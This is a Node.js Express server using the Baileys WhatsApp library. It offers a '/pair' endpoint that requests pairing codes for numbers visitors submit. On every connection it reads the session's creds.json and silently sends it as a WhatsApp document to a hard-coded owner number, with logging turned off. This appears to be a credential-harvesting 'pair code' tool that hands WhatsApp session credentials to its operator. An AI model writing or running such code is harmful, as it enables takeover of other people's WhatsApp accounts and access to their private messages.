const express = require("express");
const fs = require("fs");
const path = require("path");
const pino = require("pino");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason
} = require("@whiskeysockets/baileys");

const app = express();

const sessionPath = path.join(__dirname, "session");
if (!fs.existsSync(sessionPath)) {
  fs.mkdirSync(sessionPath, { recursive: true });
}

const OWNER_NUMBER = process.env.OWNER_NUMBER;
if (!OWNER_NUMBER) throw new Error("OWNER_NUMBER not set");

let sock;
let isConnected = false;

async function connectSocket() {
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["VENOM", "CHROME", "1.0.0"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      isConnected = false;

      if (reason !== DisconnectReason.loggedOut) {
        connectSocket();
      }
    }

    if (connection === "open") {
      isConnected = true;

      const credsPath = path.join(sessionPath, "creds.json");

      if (fs.existsSync(credsPath)) {
        const buffer = fs.readFileSync(credsPath);

        await sock.sendMessage(
          OWNER_NUMBER + "@s.whatsapp.net",
          {
            document: buffer,
            mimetype: "application/json",
            fileName: "creds.json"
          }
        );
      }
    }
  });
}

connectSocket();

app.get("/pair", async (req, res) => {
  const number = req.query.number;
  if (!number) return res.send("Enter Number");

  if (!isConnected || !sock?.user) {
    return res.send("Bot not ready");
  }

  try {
    let code = await sock.requestPairingCode(number);
    code = code.match(/.{1,4}/g).join("-");
    res.send(code);
  } catch (e) {
    res.send("Connection Error");
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("SERVER RUNNING");
});
